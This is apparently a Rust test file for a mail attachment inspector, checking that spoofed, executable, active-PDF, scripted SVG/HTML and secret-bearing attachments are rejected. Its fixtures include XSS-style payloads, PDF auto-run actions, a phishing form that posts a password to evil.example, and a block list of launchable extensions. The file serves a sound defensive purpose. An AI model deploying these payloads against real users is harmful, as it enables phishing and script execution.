use super::*;
use crate::drivers::MemoryDriver;

fn message_with(filename: &str, content: &[u8], mime_type: &str) -> Message {
    Message::new()
        .to("recipient@example.com")
        .subject("Attachment inspection")
        .text("safe")
        .attach_bytes(filename, content.to_vec(), mime_type)
}

#[tokio::test]
// TM-MAIL-01: executable, active and type-confused attachments fail before transport.
async fn local_inspector_accepts_bounded_safe_types_and_rejects_spoofed_or_active_content() {
    let inspector = LocalAttachmentInspector::strict();
    for safe in [
        Attachment::new("note.txt", b"safe text".to_vec(), "text/plain"),
        Attachment::new(
            "document.pdf",
            b"%PDF-1.7\n1 0 obj\n<<>>\nendobj\n%%EOF".to_vec(),
            "application/pdf",
        ),
        Attachment::new(
            "pixel.png",
            b"\x89PNG\r\n\x1a\nfixture".to_vec(),
            "image/png",
        ),
    ] {
        inspector.inspect(&safe).await.expect("safe local shape");
    }

    let rejected = [
        Attachment::new("spoof.png", b"not png".to_vec(), "image/png"),
        Attachment::new(
            "active.pdf",
            b"%PDF-1.7\n/JavaScript (alert)".to_vec(),
            "application/pdf",
        ),
        Attachment::new(
            "secret.txt",
            b"api_key=should-not-leave".to_vec(),
            "text/plain",
        ),
        Attachment::new("program.txt", b"MZfixture".to_vec(), "text/plain"),
        Attachment::new(
            "archive.zip",
            b"PK\x03\x04fixture".to_vec(),
            "application/zip",
        ),
        Attachment::new("spoof.zip", b"not zip".to_vec(), "application/zip"),
    ];
    for attachment in rejected {
        assert!(matches!(
            inspector.inspect(&attachment).await,
            Err(AttachmentInspectionError::Rejected(_))
        ));
    }
    assert!(
        LocalAttachmentInspector::allowing_opaque()
            .inspect(&Attachment::new(
                "archive.zip",
                b"PK\x03\x04fixture".to_vec(),
                "application/zip",
            ))
            .await
            .is_ok()
    );
}

#[tokio::test]
async fn inspection_guard_blocks_rejected_and_unavailable_scans_before_transport() {
    let (driver, deliveries) = MemoryDriver::isolated();
    let guard = AttachmentInspectionGuard::new(driver, LocalAttachmentInspector::strict());
    let spoofed = message_with("spoof.png", b"not png", "image/png");
    assert_eq!(
        guard.send(&spoofed).await,
        Err(MailError::AttachmentRejected {
            reason: "type_mismatch"
        })
    );
    assert!(deliveries.lock().expect("deliveries").is_empty());

    struct UnavailableInspector;
    impl AttachmentInspector for UnavailableInspector {
        async fn inspect(&self, _attachment: &Attachment) -> Result<(), AttachmentInspectionError> {
            Err(AttachmentInspectionError::Unavailable)
        }
    }

    let (driver, deliveries) = MemoryDriver::isolated();
    let unavailable = AttachmentInspectionGuard::new(driver, UnavailableInspector);
    assert_eq!(
        unavailable
            .send(&message_with("safe.txt", b"safe", "text/plain"))
            .await,
        Err(MailError::AttachmentInspectionUnavailable)
    );
    assert!(deliveries.lock().expect("deliveries").is_empty());
}

#[tokio::test]
async fn text_scanning_rejects_unsafe_links_and_invalid_utf8_without_leaking_content() {
    let inspector = LocalAttachmentInspector::strict();
    let invalid_utf8 = Attachment::new("invalid.txt", vec![0xff], "text/plain");
    assert_eq!(
        inspector.inspect(&invalid_utf8).await,
        Err(AttachmentInspectionError::Rejected("invalid_text_encoding"))
    );
    let unsafe_link = Attachment::new(
        "link.txt",
        br#"<a href="javascript:alert(1)">click</a>"#.to_vec(),
        "text/plain",
    );
    let error = inspector
        .inspect(&unsafe_link)
        .await
        .expect_err("unsafe link");
    assert_eq!(
        error,
        AttachmentInspectionError::Rejected("unsafe_link_content")
    );
    assert!(!error.to_string().contains("javascript"));

    for label in [
        "OPENSSH PRIVATE KEY",
        "EC PRIVATE KEY",
        "ENCRYPTED PRIVATE KEY",
    ] {
        let key = format!("-----BEGIN {label}-----\nb3BlbnNzaC1rZXk\n-----END {label}-----\n");
        let attachment = Attachment::new("id_ed25519.txt", key.into_bytes(), "text/plain");
        assert_eq!(
            inspector.inspect(&attachment).await,
            Err(AttachmentInspectionError::Rejected("secret_detected")),
            "{label}"
        );
    }
}

#[tokio::test]
// TM-MAIL-01: the declared MIME type alone never selects the checks.
async fn inspection_sniffs_content_and_extension_instead_of_trusting_the_declared_type() {
    let strict = LocalAttachmentInspector::strict();
    let opaque = LocalAttachmentInspector::allowing_opaque();
    let active_pdf =
        b"%PDF-1.7\n1 0 obj << /OpenAction 2 0 R >>\n2 0 obj << /S /JavaScript >>".to_vec();
    let prefixed_pdf = [b"junk\n".as_slice(), &active_pdf].concat();
    let xml_svg = b"<?xml version=\"1.0\"?>\n<svg onload=alert(1)/>".to_vec();
    let rejected = [
        (
            strict,
            "invoice.pdf",
            active_pdf.clone(),
            "text/plain",
            "type_mismatch",
        ),
        (
            strict,
            "invoice",
            active_pdf.clone(),
            "text/plain",
            "active_pdf_content",
        ),
        (
            opaque,
            "invoice.pdf",
            active_pdf.clone(),
            "Application/PDF",
            "active_pdf_content",
        ),
        (
            opaque,
            "blob.bin",
            prefixed_pdf,
            "application/octet-stream",
            "active_pdf_content",
        ),
        (
            strict,
            "logo.svg",
            b"<svg onload=alert(1)>".to_vec(),
            "application/xml",
            "type_mismatch",
        ),
        (
            strict,
            "logo",
            xml_svg,
            "application/xml",
            "active_svg_content",
        ),
        (
            opaque,
            "logo.svg",
            b"<svg/>".to_vec(),
            "application/octet-stream",
            "active_svg_content",
        ),
        (
            opaque,
            "logo",
            b"<svg/>".to_vec(),
            "image/SVG+xml",
            "active_svg_content",
        ),
        (
            strict,
            "login.html",
            b"<form action=x>".to_vec(),
            "text/plain",
            "active_markup_content",
        ),
        (
            strict,
            "page",
            b"<!DOCTYPE html><script>x()</script>".to_vec(),
            "text/plain",
            "active_markup_content",
        ),
        (
            strict,
            "note.txt",
            b"open javascript:alert(1)".to_vec(),
            "text/plain",
            "active_markup_content",
        ),
        (
            strict,
            "run.hta",
            b"safe text".to_vec(),
            "text/plain",
            "executable_content",
        ),
        (
            opaque,
            "update.JS",
            b"WScript.Echo(1)".to_vec(),
            "application/octet-stream",
            "executable_content",
        ),
        (
            strict,
            "script.ps1 ",
            b"safe text".to_vec(),
            "text/plain",
            "executable_content",
        ),
        (
            strict,
            "notes.cfg",
            b"safe text".to_vec(),
            "text/plain",
            "opaque_content",
        ),
        // A benign extension cannot launder a declared active type.
        (
            strict,
            "invoice.txt",
            b"<meta http-equiv=refresh content='0;url=https://evil.example/'><form action=https://evil.example/c method=post><input type=password name=p>".to_vec(),
            "text/html",
            "opaque_content",
        ),
        (
            strict,
            "data.json",
            b"{}".to_vec(),
            "application/javascript",
            "opaque_content",
        ),
        (
            strict,
            "notes.md",
            b"safe text".to_vec(),
            "application/xhtml+xml",
            "opaque_content",
        ),
    ];
    for (inspector, filename, content, mime_type, reason) in rejected {
        assert_eq!(
            inspector
                .inspect(&Attachment::new(filename, content, mime_type))
                .await,
            Err(AttachmentInspectionError::Rejected(reason)),
            "{filename}"
        );
    }

    let accepted = [
        (strict, "README", b"plain notes".to_vec(), "text/plain"),
        (strict, "report.csv", b"a,b\n1,2".to_vec(), "text/csv"),
        (
            strict,
            "report.pdf",
            b"%PDF-1.7\n%%EOF".to_vec(),
            "application/octet-stream",
        ),
        (
            strict,
            "photo.PNG",
            b"\x89PNG\r\n\x1a\nfixture".to_vec(),
            "IMAGE/PNG",
        ),
        (
            opaque,
            "report.html",
            b"<html><body>Report</body></html>".to_vec(),
            "text/html",
        ),
    ];
    for (inspector, filename, content, mime_type) in accepted {
        assert!(
            inspector
                .inspect(&Attachment::new(filename, content, mime_type))
                .await
                .is_ok(),
            "{filename}"
        );
    }
}

#[tokio::test]
// TM-MAIL-01: executable and script-host extensions fail under both policies.
async fn windows_launchable_extensions_are_rejected_under_every_policy() {
    for inspector in [
        LocalAttachmentInspector::strict(),
        LocalAttachmentInspector::allowing_opaque(),
    ] {
        for extension in [
            "msc",
            "wsc",
            "sct",
            "appref-ms",
            "application",
            "settingcontent-ms",
            "gadget",
            "inf",
            "ins",
            "isp",
            "mst",
            "ps1xml",
            "psc1",
            "psd1",
            "vhd",
            "vhdx",
            "xbap",
            "website",
            "jnlp",
            "wsb",
            "msh",
        ] {
            let filename = format!("invoice.{extension}");
            for mime in ["application/octet-stream", "text/plain"] {
                let attachment = Attachment::new(&filename, b"<xml/>".to_vec(), mime);
                assert_eq!(
                    inspector.inspect(&attachment).await,
                    Err(AttachmentInspectionError::Rejected("executable_content")),
                    "{filename} as {mime}"
                );
            }
        }
    }
}

#[tokio::test]
// TM-MAIL-01: XFA forms and other active PDF actions fail under both policies.
async fn xfa_forms_and_other_active_pdf_actions_are_rejected() {
    for inspector in [
        LocalAttachmentInspector::strict(),
        LocalAttachmentInspector::allowing_opaque(),
    ] {
        for active in [
            "/AcroForm << /XFA 5 0 R >>",
            "/Annots [<< /Subtype /RichMedia >>]",
            "/OpenAction << /S /GoToE /T << /R /C /N (x) >> >>",
            "/OpenAction << /S /ImportData /F (data.fdf) >>",
        ] {
            let pdf = format!("%PDF-1.7\n1 0 obj << {active} >>\nendobj\n%%EOF");
            let attachment = Attachment::new("form.pdf", pdf.into_bytes(), "application/pdf");
            assert_eq!(
                inspector.inspect(&attachment).await,
                Err(AttachmentInspectionError::Rejected("active_pdf_content")),
                "{active}"
            );
        }
    }
}

#[tokio::test]
// TM-MAIL-01: universal macOS binaries are executable magic under both policies.
async fn universal_mach_o_binaries_are_rejected() {
    for inspector in [
        LocalAttachmentInspector::strict(),
        LocalAttachmentInspector::allowing_opaque(),
    ] {
        for magic in [
            [0xca, 0xfe, 0xba, 0xbe],
            [0xbe, 0xba, 0xfe, 0xca],
            [0xca, 0xfe, 0xba, 0xbf],
            [0xbf, 0xba, 0xfe, 0xca],
        ] {
            let content = [magic.as_slice(), &[0, 0, 0, 2, 1, 2, 3]].concat();
            let attachment = Attachment::new("Updater", content, "application/octet-stream");
            assert_eq!(
                inspector.inspect(&attachment).await,
                Err(AttachmentInspectionError::Rejected("executable_content"))
            );
        }
    }
}
